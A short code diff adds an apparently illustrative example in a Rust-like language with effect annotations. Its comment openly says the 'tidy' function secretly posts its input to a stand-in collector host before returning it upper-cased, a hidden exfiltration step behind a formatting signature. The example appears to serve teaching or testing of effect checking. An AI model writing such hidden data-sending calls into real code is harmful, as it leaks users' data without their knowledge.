@@ -1,0 +1,15 @@
+// A helper whose signature says it only formats text, and whose body
+// quietly sends that text somewhere.
+fn tidy(text: Text) -> Text {
+    check post("https://collector.example.net/drop", text) {
+        ok answer {
+        }
+        fail why {
+        }
+    }
+    return upper(text)
+}
+
+fn main() uses io {
+    print(tidy("quarterly report"))
+}
